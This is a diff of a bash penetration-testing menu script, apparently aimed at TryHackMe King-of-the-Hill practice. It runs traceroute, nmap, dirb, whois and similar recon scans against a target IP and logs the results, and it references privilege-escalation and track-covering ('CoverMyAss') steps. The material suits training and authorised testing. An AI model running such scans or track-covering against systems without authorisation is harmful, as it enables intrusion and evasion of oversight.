-            # sh CoverMyAss
-            CoverMe
             ;;
             x|X|exit|EXIT )
             cd $XHacKingPro
@@ -2635,7 +2489,7 @@ MainMenu(){
           fi
           #  [2] - Reconnaissance & Vulnerability Assessment
           echo " " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
-          echo "# [2] - Reconnaissance & Vulnerability Assessment | Date: `date` " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
+          echo "# [2] - Reconnaissance & Vulnerability Assessment | Date: $(date) " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
           echo "> - ### Target Name: ${targetNAME}" >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
           echo "> - ### Target IP: ${targetIP}" >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
           echo "> - ### Target Email: ${targetEmail}" >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
@@ -2701,7 +2555,7 @@ MainMenu(){
               #
               xMenu02_arp=$(arp -an)
               xMenu02_arp_x=$(
-              echo "\n\t\t${BGreen}### Arp Scan Log Time: `date`"
+              echo "\n\t\t${BGreen}### Arp Scan Log Time: $(date)"
               echo "# Arp Scan Log $targetIP: " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
               echo " " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
               echo " $xMenu02_arp " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
@@ -2711,71 +2565,71 @@ MainMenu(){
               ;;
               1|01 )
               #
-              echo "\n\t\t${BGreen}### TraceRoute Scan Log Time: `date`"
+              echo "\n\t\t${BGreen}### TraceRoute Scan Log Time: $(date)"
               echo "# TraceRoute Scan Log $targetIP: " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
               echo " " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
-              echo " `traceroute $targetIP` " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
+              echo " $(traceroute $targetIP) " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
               echo " " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
               read -p "$Press_ENTER"
               ;;
               2|02 )
               #
-              echo "\n\t\t${BGreen}### Ping Scan Log Time: `date`"
+              echo "\n\t\t${BGreen}### Ping Scan Log Time: $(date)"
               echo "# Ping Scan Log $targetIP: " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
               echo " " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
-              echo " `ping $targetIP -c4` " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
+              echo " $(ping $targetIP -c4) " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
               echo " " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
               read -p "$Press_ENTER"
               ;;
               3|03 )
               #
-              echo "\n\t\t${BGreen}### Nslookup Scan Log Time: `date`"
+              echo "\n\t\t${BGreen}### Nslookup Scan Log Time: $(date)"
               echo "# Nslookup Scan Log $targetIP: " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
               echo " " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
-              echo " `nslookup $targetIP` " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
+              echo " $(nslookup $targetIP) " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
               echo " " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
               read -p "$Press_ENTER"
               ;;
               4|04 )
               #
-              echo "\n\t\t${BGreen}### Dig Scan Log Time: `date`"
+              echo "\n\t\t${BGreen}### Dig Scan Log Time: $(date)"
               echo "# Dig Scan Log $targetIP: " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
               echo " " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
-              echo " `dig $targetIP all` " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
+              echo " $(dig $targetIP all) " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
               echo " " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
               read -p "$Press_ENTER"
               ;;
               5|05 )
               #
-              echo "\n\t\t${BGreen}### WhoIs Scan Log Time: `date`"
+              echo "\n\t\t${BGreen}### WhoIs Scan Log Time: $(date)"
               echo "# WhoIs Scan Log $targetIP: " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
               echo " " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
-              echo " `whois $targetIP` " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
+              echo " $(whois $targetIP) " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
               echo " " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
               read -p "$Press_ENTER"
               ;;
               6|06 )
               #
-              echo "\n\t\t${BGreen}### Dirb Scan Log Time: `date`"
+              echo "\n\t\t${BGreen}### Dirb Scan Log Time: $(date)"
               echo "# Dirb Scan Log $targetIP: " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
               echo " " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
-              echo " `dirb http://$targetIP` " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
+              echo " $(dirb http://$targetIP) " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
               echo " " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
               read -p "$Press_ENTER"
               ;;
               7|07 )
               #
-              echo "\n\t\t${BGreen}### Nmap Scan Log Time: `date`"
+              echo "\n\t\t${BGreen}### Nmap Scan Log Time: $(date)"
               echo "# Nmap Scan Log $targetIP: " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
               echo " " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
-              echo " `nmap -sV -sC -O $targetIP ` " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
+              echo " $(nmap -sV -sC -O $targetIP) " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
               echo " " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
               read -p "$Press_ENTER"
               ;;
               test )
               clear
               DoSomething=$(arp -a)
-              PrintSomeThing=$(echo "\n\n`date`\n\n$DoSomething" )
+              PrintSomeThing=$(echo "\n\n$(date)\n\n$DoSomething" )
               echo "$PrintSomeThing"
               read -p "$Press_ENTER"
               ;;
@@ -3402,249 +3256,275 @@ MainMenu(){
             a )
             AnonMainMenu
             ;;
-            1 )
-            echo "\n\t\t${BRed}[${BBlue}1${BRed}]${BWhite} - ${BRed}Planning and Scoping"
+            # 1 )
+            # echo "\n\t\t${BRed}[${BBlue}1${BRed}]${BWhite} - ${BRed}Planning and Scoping"
+            # #
+            # t1="$(echo "\n${BBlue}[${BYellow}?${BBlue}]${BGreen} - IP / Host of Target / Client: ${BRed}")"
+            # read -p "$t1" targetIP
+            # if [ -z $targetIP ]; then
+            #   #statements
+            #   targetIP="127.0.0.1"
+            # fi
+            # #
+            # t2="$(echo "\n${BBlue}[${BYellow}?${BBlue}]${BGreen} - Name of Target / Client: ${BRed}")"
+            # read -p "$t2" targetLogNAME
+            # if [ -z $targetLogNAME ]; then
+            #   #statements
+            #   targetLogNAME="ChangeMe_SetTarget"
+            #   echo "\n\t\t${BBlue}[${BRed}!${BBlue}]${BGreen} - Name of Target / Client: ${BRed} $targetLogNAME"
+            # fi
+            # #
+            # file="${targetLogNAME}-KoTH-Log.md"
+            # if [ -e ${file} ]; then
+            #   t2="$(echo "\n${BBlue}[${BRed}!${BBlue}]${BRed} - File Exist! Remove it? [yY/nN]: ")"
+            #   read -p "$t2 " filexist
+            #   case $filexist in
+            #     y|Y)
+            #     echo "  ${BBlue}[${BRed}!${BBlue}] Removing {${targetLogNAME}-KoTH-Log.md} file .."
+            #     rm ${targetLogNAME}-KoTH-Log.md
+            #     clear
+            #     ;;
+            #     n|N)
+            #     echo "  ${BBlue}[${BRed}!${BBlue}] Leaving {${targetLogNAME}-KoTH-Log.md} file and Add to it .."
+            #     ;;
+            #   esac
+            # fi
             #
-            t1="$(echo "\n${BBlue}[${BYellow}?${BBlue}]${BGreen} - IP / Host of Target / Client: ${BRed}")"
-            read -p "$t1" targetIP
+            # # Define variable for THM username
+            # read_username=$(echo "\n${BBlue}[${BRed}?${BBlue}]${BGreen} - What Your User Name on TryHackMe: ${BRed} ")
+            # read -p "$read_username" Alm
+            # if [ -z $Alm ]; then
+            #   #statements
+            #   Alm="Anlominus"
+            # fi
+            # username="$Alm"
+            #
+            # # Define directory were $username.ovpn is located
+            # vpn_dir="$HOME/.thm/.vpn"
+            # if [ -d /$HOME/.thm/.vpn ]; then
+            #   #statements
+            #   echo "\n\t\t${BBlue}[${BRed}!${BBlue}]${BGreen} - Found!  TryHackme VPN Path Location exists ! ~>: $DGrey  $vpn_dir  \n"
+            #   ls -lahs $vpn_dir
+            # else
+            #   echo "\n\t\t${BBlue}[${BRed}!${BBlue}]${BGreen} - Creating .vpn Folder In $vpn_dir Directory\n ${BRed} "
+            #   mkdir $HOME/.thm/
+            #   mkdir $HOME/.thm/.vpn
+            #   cd $HOME/.thm/.vpn
+            #   vpn_dir="$HOME/.thm/.vpn"
+            #   ls -lahs $vpn_dir
+            # fi
+            #
+            # # Define variable for our search string (find this running process)
+            # vpn_file="$vpn_dir/$username.ovpn"
+            # if [ -e $vpn_file ]; then
+            #   #statements
+            #   echo "\n\t\t${BBlue}[${BRed}!${BBlue}]${BGreen} - Found TryHackme VPN File ~>: $DGrey  $vpn_file  \n"
+            # else
+            #   cant_found=$(echo "\n${BBlue}[${BRed}!${BBlue}]${BRed} - Sorry Can't Found TryHackme VPN File !! \n\n\t\t  Enter $username.ovpn Location ~>: ")
+            #   read -p "$cant_found"  this_location
+            #   if [ -e $this_location ]; then
+            #     #statements
+            #     echo "\n\t\t${BBlue}[${BRed}!${BBlue}]${BGreen} - Found TryHackme VPN File ~>: $DGrey  $this_location $BRed Copying To $vpn_dir/\n"
+            #     cp $this_location $vpn_file
+            #     ls -lahs $vpn_dir
+            #   else
+            #     echo "\n\t\t${BBlue}[${BRed}!${BBlue}]${BRed} - Sorry Can't Found TryHackme VPN File !! Maybe you dont have it?"
+            #   fi
+            # fi
+            # # Regex pattern to validate IP format (#.#.#.#)
+            # valid_ip="([0-9]{1,3}\.){3}"
+            # valid_thm=".*\.thm$"
+            #
+            # # Session logfile
+            # session_log=$vpn_dir/.logs/KoTH-$(date).log
+            # echo "\n\t\t${BBlue}[${BRed}!${BBlue}]${BGreen} - Session logfile ~>: $DGrey $session_log\n"
+            # ls -lahs $session_log
+            #
+            # # Location of profile to update (.zshrc, .bashrc, .bash_profile, etc)
+            # profile_file=~/.zshrc
+            #
+            # # Save the incoming args to vars with better names (./thm-vm ${targetIP} $2 $3)
+            # arg1=${targetIP}
+            # arg2=$2
+            # arg3=$3
+            #
+            # # Error helper function, prefix with red color and exit 1 (non zero is error)
+            # # https://emojipedia.org/search/?q=warning
+            # # 🚫 🚭 🚨
+            # error() {
+            #   echo "      ${BCyan}  |---------------------------------"
+            #   prefix="\n\t\t [ERROR] \t"
+            #   echo "${BRed}${prefix}${1}${Color_Off}\n"
+            #   echo "      ${BCyan}  |---------------------------------"
+            # }
+            #
+            # # Warning helper function, show warning prefix with yellow color
+            # warn() {
+            #   echo "      ${BCyan}  |---------------------------------"
+            #   prefix="\n\t\t [WARN] \t"
+            #   echo "${BYellow}${prefix}${1}${Color_Off}\n"
+            #   echo "      ${BCyan}  |---------------------------------"
+            # }
+            #
+            # # log log with cyan color & prefix
+            # log() {
+            #   echo "      ${BCyan}  |---------------------------------"
+            #   prefix="\n\t\t [INFO] \t"
+            #   echo "${BCyan}${prefix}${1}${Color_Off}\n"
+            #   echo "      ${BCyan}  |---------------------------------"
+            # }
+            #
+            # # Function to read user input, and return boolean whether they confirm "[Y/n]"
+            # # NOTE: Capital "Y" typically denotes default, so no resp (just enter key) will be "yes" (true)
+            # confirmYes() {
+            #   echo ""
+            #   msg="${1:-Are you sure?}"
+            #   read -r -p "${msg} [Y/n] " response
+            #   case "$response" in
+            #     [nN][oO]|[nN])
+            #       return 1
+            #       ;;
+            #     *)
+            #       return 0
+            #       ;;
+            #   esac
+            # }
+            #
+            # connectVpn() {
+            #   if [ "$vpn_running" != "0" ]; then
+            #     warn "🤨 THM VPN is not running!"
+            #     warn "Searching for process: '$vpn_file' (using ps aux | grep ...)"
+            #     if confirmYes "Connect to VPN now? (requires sudo)"; then
+            #       # sudo echo "init" > $session_log
+            #       sudo openvpn "$vpn_file" > $session_log
+            #       log "Done! 😁"
+            #     fi
+            #   else
+            #     log "Found tun0 & Connection Confirmed 👍"
+            #   fi
+            #   log "THM VPN Connection Confirmed 👍"
+            #   echo "\n\n\t\t  ${BCyan} $(ifconfig tun0) \n"
+            #   echo "\n\n\t\t  ${BCyan} $(ps aux | grep $vpn_file) \n"
+            # }
+            #
+            # hostsModify="$(echo "\n${BBlue}[${BYellow}?${BBlue}] 🔶 ${BGreen}Adding ${BYellow}$targetIP ${targetLogNAME} ${BGreen}to /etc/hosts? [y|Y] or [press ENTER]   ")"
+            # read -p "$hostsModify" hostsMod
+            # case $hostsMod in
+            #   y|Y|yes|YES )
+            #   echo "      ${BBlue}[${BRed}#${BBlue}] 🔶 ${BGreen}Adding $targetIP ${targetLogNAME} to /etc/hosts ${BRed}${tryhackmeVpnIP}"
+            #   echo "$targetIP    ${targetLogNAME}.thm" | sudo tee -a /etc/hosts
+            #     ;;
+            #   n|N|no|NO )
+            #   break
+            #   ;;
+            # esac
+            #
+            # # Check if openvpn connection is running
+            # ifconfig tun0
+            # vpn_running=$?
+            # 0|00 )
+            # #
+            # xMenu02_arp=$(arp -an)
+            # xMenu02_arp_x=$(
+            # echo "\n\t\t${BGreen}### Arp Scan Log Time: $(date)"
+            # echo "# Arp Scan Log $targetIP: " >> ${targetNAME}-HacKingPro-KoTH-Log.md
+            # echo " " >> ${targetNAME}-HacKingPro-KoTH-Log.md
+            # echo " $xMenu02_arp " >> ${targetNAME}-HacKingPro-KoTH-Log.md
+            # echo " " >> ${targetNAME}-HacKingPro-Recon-Log.)
+            # echo "$xMenu02_arp_x"
+            # read -p "$Press_ENTER"
+            # ;;
+            1|01 )
             if [ -z $targetIP ]; then
-              #statements
-              targetIP="127.0.0.1"
-            fi
-            #
-            t2="$(echo "\n${BBlue}[${BYellow}?${BBlue}]${BGreen} - Name of Target / Client: ${BRed}")"
-            read -p "$t2" targetLogNAME
-            if [ -z $targetLogNAME ]; then
-              #statements
-              targetLogNAME="ChangeMe_SetTarget"
-              echo "\n\t\t${BBlue}[${BRed}!${BBlue}]${BGreen} - Name of Target / Client: ${BRed} $targetLogNAME"
-            fi
-            #
-            file="${targetLogNAME}-KoTH-Log.md"
-            if [ -e ${file} ]; then
-              t2="$(echo "\n${BBlue}[${BRed}!${BBlue}]${BRed} - File Exist! Remove it? [yY/nN]: ")"
-              read -p "$t2 " filexist
-              case $filexist in
-                y|Y)
-                echo "  ${BBlue}[${BRed}!${BBlue}] Removing {${targetLogNAME}-KoTH-Log.md} file .."
-                rm ${targetLogNAME}-KoTH-Log.md
-                clear
-                ;;
-                n|N)
-                echo "  ${BBlue}[${BRed}!${BBlue}] Leaving {${targetLogNAME}-KoTH-Log.md} file and Add to it .."
-                ;;
-              esac
-            fi
-
-            # Define variable for THM username
-            read_username=$(echo "\n${BBlue}[${BRed}?${BBlue}]${BGreen} - What Your User Name on TryHackMe: ${BRed} ")
-            read -p "$read_username" Alm
-            if [ -z $Alm ]; then
-              #statements
-              Alm="Anlominus"
-            fi
-            username="$Alm"
-
-            # Define directory were $username.ovpn is located
-            vpn_dir="$HOME/.thm/.vpn"
-            if [ -d /$HOME/.thm/.vpn ]; then
-              #statements
-              echo "\n\t\t${BBlue}[${BRed}!${BBlue}]${BGreen} - Found!  TryHackme VPN Path Location exists ! ~>: $DGrey  $vpn_dir  \n"
-              ls -lahs $vpn_dir
+              Checking_IP_Target
             else
-              echo "\n\t\t${BBlue}[${BRed}!${BBlue}]${BGreen} - Creating .vpn Folder In $vpn_dir Directory\n ${BRed} "
-              mkdir $HOME/.thm/
-              mkdir $HOME/.thm/.vpn
-              cd $HOME/.thm/.vpn
-              vpn_dir="$HOME/.thm/.vpn"
-              ls -lahs $vpn_dir
+              #
+              echo "\n\t\t${BGreen}### TraceRoute Scan Log Time: $(date)"
+              echo "# TraceRoute Scan Log $targetIP: " >> ${targetNAME}-HacKingPro-KoTH-Log.md
+              echo " " >> ${targetNAME}-HacKingPro-KoTH-Log.md
+              echo " $(traceroute $targetIP) " >> ${targetNAME}-HacKingPro-KoTH-Log.md
+              echo " " >> ${targetNAME}-HacKingPro-KoTH-Log.md
+              read -p "$Press_ENTER"
             fi
-
-            # Define variable for our search string (find this running process)
-            vpn_file="$vpn_dir/$username.ovpn"
-            if [ -e $vpn_file ]; then
-              #statements
-              echo "\n\t\t${BBlue}[${BRed}!${BBlue}]${BGreen} - Found TryHackme VPN File ~>: $DGrey  $vpn_file  \n"
+            ;;
+            2|02 )
+            if [ -z $targetIP ]; then
+              Checking_IP_Target
             else
-              cant_found=$(echo "\n${BBlue}[${BRed}!${BBlue}]${BRed} - Sorry Can't Found TryHackme VPN File !! \n\n\t\t  Enter $username.ovpn Location ~>: ")
-              read -p "$cant_found"  this_location
-              if [ -e $this_location ]; then
-                #statements
-                echo "\n\t\t${BBlue}[${BRed}!${BBlue}]${BGreen} - Found TryHackme VPN File ~>: $DGrey  $this_location $BRed Copying To $vpn_dir/\n"
-                cp $this_location $vpn_file
-                ls -lahs $vpn_dir
-              else
-                echo "\n\t\t${BBlue}[${BRed}!${BBlue}]${BRed} - Sorry Can't Found TryHackme VPN File !! Maybe you dont have it?"
-              fi
+              #
+              echo "\n\t\t${BGreen}### Ping Scan Log Time: $(date)"
+              echo "# Ping Scan Log $targetIP: " >> ${targetNAME}-HacKingPro-KoTH-Log.md
+              echo " " >> ${targetNAME}-HacKingPro-KoTH-Log.md
+              echo " $(ping $targetIP -c4) " >> ${targetNAME}-HacKingPro-KoTH-Log.md
+              echo " " >> ${targetNAME}-HacKingPro-KoTH-Log.md
+              read -p "$Press_ENTER"
             fi
-            # Regex pattern to validate IP format (#.#.#.#)
-            valid_ip="([0-9]{1,3}\.){3}"
-            valid_thm=".*\.thm$"
-
-            # Session logfile
-            session_log=$vpn_dir/.logs/KoTH-$(date).log
-            echo "\n\t\t${BBlue}[${BRed}!${BBlue}]${BGreen} - Session logfile ~>: $DGrey $session_log\n"
-            ls -lahs $session_log
-
-            # Location of profile to update (.zshrc, .bashrc, .bash_profile, etc)
-            profile_file=~/.zshrc
-
-            # Save the incoming args to vars with better names (./thm-vm ${targetIP} $2 $3)
-            arg1=${targetIP}
-            arg2=$2
-            arg3=$3
-
-            # Error helper function, prefix with red color and exit 1 (non zero is error)
-            # https://emojipedia.org/search/?q=warning
-            # 🚫 🚭 🚨
-            error() {
-              echo "      ${cyan}  |---------------------------------"
-              prefix="\n\t\t [ERROR] \t"
-              echo "${BRed}${prefix}${1}${nocolor}\n"
-              echo "      ${cyan}  |---------------------------------"
-            }
-
-            # Warning helper function, show warning prefix with yellow color
-            warn() {
-              echo "      ${cyan}  |---------------------------------"
-              prefix="\n\t\t [WARN] \t"
-              echo "${BYellow}${prefix}${1}${nocolor}\n"
-              echo "      ${cyan}  |---------------------------------"
-            }
-
-            # log log with cyan color & prefix
-            log() {
-              echo "      ${cyan}  |---------------------------------"
-              prefix="\n\t\t [INFO] \t"
-              echo "${BCyan}${prefix}${1}${nocolor}\n"
-              echo "      ${cyan}  |---------------------------------"
-            }
-
-            # Function to read user input, and return boolean whether they confirm "[Y/n]"
-            # NOTE: Capital "Y" typically denotes default, so no resp (just enter key) will be "yes" (true)
-            confirmYes() {
-              echo ""
-              msg="${1:-Are you sure?}"
-              read -r -p "${msg} [Y/n] " response
-              case "$response" in
-                [nN][oO]|[nN])
-                  return 1
-                  ;;
-                *)
-                  return 0
-                  ;;
-              esac
-            }
-
-            connectVpn() {
-              if [ "$vpn_running" != "0" ]; then
-                warn "🤨 THM VPN is not running!"
-                warn "Searching for process: '$vpn_file' (using ps aux | grep ...)"
-                if confirmYes "Connect to VPN now? (requires sudo)"; then
-                  # sudo echo "init" > $session_log
-                  sudo openvpn $vpn_file > $session_log
-                  log "Done! 😁"
-                fi
-              else
-                log "Found tun0 & Connection Confirmed 👍"
-              fi
-              log "THM VPN Connection Confirmed 👍"
-              echo "\n\n\t\t  $cyan $(ifconfig tun0) \n"
-              echo "\n\n\t\t  $cyan $(ps aux | grep $vpn_file) \n"
-            }
-
-            hostsModify="$(echo "\n${BBlue}[${BYellow}?${BBlue}] 🔶 ${BGreen}Adding ${BYellow}$targetIP ${targetLogNAME} ${BGreen}to /etc/hosts? [y|Y] or [press ENTER]   ")"
-            read -p "$hostsModify" hostsMod
-            case $hostsMod in
-              y|Y|yes|YES )
-              echo "      ${BBlue}[${BRed}#${BBlue}] 🔶 ${BGreen}Adding $targetIP ${targetLogNAME} to /etc/hosts ${BRed}${tryhackmeVpnIP}"
-              echo "$targetIP    ${targetLogNAME}.thm" | sudo tee -a /etc/hosts
-                ;;
-              n|N|no|NO )
-              break
-              ;;
-            esac
-
-            # Check if openvpn connection is running
-            ifconfig tun0
-            vpn_running=$?
-
             ;;
-            2 )
-            clear
-            echo "\n\t\t${BRed}[${BBlue}2${BRed}]${BWhite} -${BRed} Reconnaissance & Vulnerability Assessment"
-
-            #  [2] - Reconnaissance & Vulnerability Assessment
-            echo "#### Date: `date`" >> ${targetLogNAME}-KoTH-Log.md
-            echo " " >> ${targetLogNAME}-KoTH-Log.md
-            echo "# [2] - Reconnaissance & Vulnerability Assessment " >> ${targetLogNAME}-KoTH-Log.md
-            echo " " >> ${targetLogNAME}-KoTH-Log.md
+            3|03 )
             #
-            echo "\n\t\t${BGreen}### Arp Scan Log `date`"
-            echo "### Arp Scan Log $targetIP: " >> ${targetLogNAME}-KoTH-Log.md
-            echo " " >> ${targetLogNAME}-KoTH-Log.md
-            echo " " >> ${targetLogNAME}-KoTH-Log.md
-            echo " `arp -an` " >> ${targetLogNAME}-KoTH-Log.md
-            echo " " >> ${targetLogNAME}-KoTH-Log.md
-            #
-            echo "\n\t\t${BGreen}### TraceRoute Scan Log `date`"
-            echo "### TraceRoute Scan Log $targetIP: " >> ${targetLogNAME}-KoTH-Log.md
-            echo " " >> ${targetLogNAME}-KoTH-Log.md
-            echo " `traceroute $targetIP` " >> ${targetLogNAME}-KoTH-Log.md
-            echo " " >> ${targetLogNAME}-KoTH-Log.md
-            #
-            echo "\n\t\t${BGreen}### Ping Scan Log `date`"
-            echo "### Ping Scan Log $targetIP: " >> ${targetLogNAME}-KoTH-Log.md
-            echo " " >> ${targetLogNAME}-KoTH-Log.md
-            echo " `ping $targetIP -c4` " >> ${targetLogNAME}-KoTH-Log.md
-            echo " " >> ${targetLogNAME}-KoTH-Log.md
-            #
-            echo "\n\t\t${BGreen}### Dig Scan Log `date`"
-            echo "### Dig Scan Log $targetIP: " >> ${targetLogNAME}-KoTH-Log.md
-            echo " " >> ${targetLogNAME}-KoTH-Log.md
-            echo " `dig $targetIP all` " >> ${targetLogNAME}-KoTH-Log.md
-            echo " " >> ${targetLogNAME}-KoTH-Log.md
-            #
-            echo "\n\t\t${BGreen}### Nslookup Scan Log `date`"
-            echo "### Nslookup Scan Log $targetIP: " >> ${targetLogNAME}-KoTH-Log.md
-            echo " " >> ${targetLogNAME}-KoTH-Log.md
-            echo " `nslookup $targetIP` " >> ${targetLogNAME}-KoTH-Log.md
-            echo " " >> ${targetLogNAME}-KoTH-Log.md
-            #
-            echo "\n\t\t${BGreen}### WhoIs Scan Log `date`"
-            echo "### WhoIs Scan Log $targetIP: " >> ${targetLogNAME}-KoTH-Log.md
-            echo " " >> ${targetLogNAME}-KoTH-Log.md
-            echo " `whois $targetIP` " >> ${targetLogNAME}-KoTH-Log.md
-            echo " " >> ${targetLogNAME}-KoTH-Log.md
-            #
-            echo "\n\t\t${BGreen}### Nmap Scan Log `date`"
-            echo "### Nmap Scan Log $targetIP: " >> ${targetLogNAME}-KoTH-Log.md
-            echo " " >> ${targetLogNAME}-KoTH-Log.md
-            echo " `nmap -sV -sC -O $targetIP ` " >> ${targetLogNAME}-KoTH-Log.md
-            echo " " >> ${targetLogNAME}-KoTH-Log.md
-            #
-            echo "---" >> ${targetLogNAME}-KoTH-Log.md
-            echo " " >> ${targetLogNAME}-KoTH-Log.md
-            echo " " >> ${targetLogNAME}-KoTH-Log.md
+            echo "\n\t\t${BGreen}### Nslookup Scan Log Time: $(date)"
+            echo "# Nslookup Scan Log $targetIP: " >> ${targetNAME}-HacKingPro-KoTH-Log.md
+            echo " " >> ${targetNAME}-HacKingPro-KoTH-Log.md
+            echo " $(nslookup $targetIP) " >> ${targetNAME}-HacKingPro-KoTH-Log.md
+            echo " " >> ${targetNAME}-HacKingPro-KoTH-Log.md
+            read -p "$Press_ENTER"
             ;;
-            3 )
-            echo "\n\t\t${BRed}[${BBlue}3${BRed}]${BWhite} -${BRed} Gaining Access & Maintaining Access"
-            privilegeEscalation
+            4|04 )
+            #
+            echo "\n\t\t${BGreen}### Dig Scan Log Time: $(date)"
+            echo "# Dig Scan Log $targetIP: " >> ${targetNAME}-HacKingPro-KoTH-Log.md
+            echo " " >> ${targetNAME}-HacKingPro-KoTH-Log.md
+            echo " $(dig $targetIP all) " >> ${targetNAME}-HacKingPro-KoTH-Log.md
+            echo " " >> ${targetNAME}-HacKingPro-KoTH-Log.md
+            read -p "$Press_ENTER"
             ;;
-            4 )
-            echo "\n\t\t${BRed}[${BBlue}4${BRed}]${BWhite} -${BRed} Covering tracks"
+            5|05 )
+            #
+            echo "\n\t\t${BGreen}### WhoIs Scan Log Time: $(date)"
+            echo "# WhoIs Scan Log $targetIP: " >> ${targetNAME}-HacKingPro-KoTH-Log.md
+            echo " " >> ${targetNAME}-HacKingPro-KoTH-Log.md
+            echo " $(whois $targetIP) " >> ${targetNAME}-HacKingPro-KoTH-Log.md
+            echo " " >> ${targetNAME}-HacKingPro-KoTH-Log.md
+            read -p "$Press_ENTER"
             ;;
-            5 )
-            echo "\n\t\t${BRed}[${BBlue}5${BRed}]${BWhite} -${BRed} Analysis & Reporting"
+            6|06 )
+            #
+            echo "\n\t\t${BGreen}### Dirb Scan Log Time: $(date)"
+            echo "# Dirb Scan Log $targetIP: " >> ${targetNAME}-HacKingPro-KoTH-Log.md
+            echo " " >> ${targetNAME}-HacKingPro-KoTH-Log.md
+            echo " $(dirb http://$targetIP) " >> ${targetNAME}-HacKingPro-KoTH-Log.md
+            echo " " >> ${targetNAME}-HacKingPro-KoTH-Log.md
+            read -p "$Press_ENTER"
             ;;
+            7|07 )
+            #
+            echo "\n\t\t${BGreen}### Nmap Scan Log Time: $(date)"
+            echo "# Nmap Scan Log $targetIP: " >> ${targetNAME}-HacKingPro-KoTH-Log.md
+            echo " " >> ${targetNAME}-HacKingPro-KoTH-Log.md
+            echo " $(nmap -sV -sC -O $targetIP) " >> ${targetNAME}-HacKingPro-KoTH-Log.md
+            echo " " >> ${targetNAME}-HacKingPro-KoTH-Log.md
+            read -p "$Press_ENTER"
+            ;;
+            # 3 )
+            # echo "\n\t\t${BRed}[${BBlue}3${BRed}]${BWhite} -${BRed} Gaining Access & Maintaining Access"
+            # privilegeEscalation
+            # ;;
+            # 4 )
+            # echo "\n\t\t${BRed}[${BBlue}4${BRed}]${BWhite} -${BRed} Covering tracks"
+            # ;;
+            # 5 )
+            # echo "\n\t\t${BRed}[${BBlue}5${BRed}]${BWhite} -${BRed} Analysis & Reporting"
+            # ;;
             x|X|exit|quit|Exit )
             clear
             HacKingPro=$(echo "${BRed}Hac${BYellow}King${BBlue}Pro")
             echo "\n\t\t ${BRed}[🙏🏼${BRed}] ${BWhite}Exit ${HacKingPro} ${BRed}[🙏🏼${BRed}]\n\t\t ${BGreen}"
             break
             ;;
+
           esac
         done
+
       }
       MainMenu
       ;;
